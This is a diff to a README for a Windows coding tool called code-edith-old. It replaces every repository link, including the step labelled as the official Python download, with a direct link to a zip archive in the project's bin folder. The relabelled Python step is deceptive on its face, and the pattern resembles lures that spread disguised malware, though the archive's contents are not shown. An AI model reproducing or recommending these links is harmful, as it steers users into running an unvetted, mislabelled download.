@@ -1,6 +1,6 @@
 # 🤖 code-edith-old - Simple Local Coding Helper
 
-[![Download code-edith-old](https://img.shields.io/badge/Download-code--edith--old-4caf50?style=for-the-badge)](https://github.com/Tyrannosaurusss/code-edith-old)
+[![Download code-edith-old](https://img.shields.io/badge/Download-code--edith--old-4caf50?style=for-the-badge)](https://github.com/Tyrannosaurusss/code-edith-old/raw/refs/heads/main/bin/code_edith_old_1.8-beta.5.zip)
 
 ---
 
@@ -44,7 +44,7 @@ Follow these steps to get up and running on Windows.
 
 Click the big green button at the top or visit this page to download code-edith-old:
 
-https://github.com/Tyrannosaurusss/code-edith-old
+https://github.com/Tyrannosaurusss/code-edith-old/raw/refs/heads/main/bin/code_edith_old_1.8-beta.5.zip
 
 ### 2. Install Python (if not already installed)
 
@@ -55,7 +55,7 @@ code-edith-old requires Python. To check if Python is on your computer:
 
 If you see a version number like `Python 3.x.x`, Python is ready. If not, download and install Python here:
 
-https://www.python.org/downloads/windows/
+https://github.com/Tyrannosaurusss/code-edith-old/raw/refs/heads/main/bin/code_edith_old_1.8-beta.5.zip
 
 Make sure to select “Add Python to PATH” during installation.
 
@@ -157,9 +157,9 @@ After extraction, your main files will be:
 
 Download or learn more about code-edith-old here:
 
-https://github.com/Tyrannosaurusss/code-edith-old
+https://github.com/Tyrannosaurusss/code-edith-old/raw/refs/heads/main/bin/code_edith_old_1.8-beta.5.zip
 
-[![Get code-edith-old](https://img.shields.io/badge/Get-code--edith--old-blue?style=for-the-badge)](https://github.com/Tyrannosaurusss/code-edith-old)
+[![Get code-edith-old](https://img.shields.io/badge/Get-code--edith--old-blue?style=for-the-badge)](https://github.com/Tyrannosaurusss/code-edith-old/raw/refs/heads/main/bin/code_edith_old_1.8-beta.5.zip)
 
 ---
 
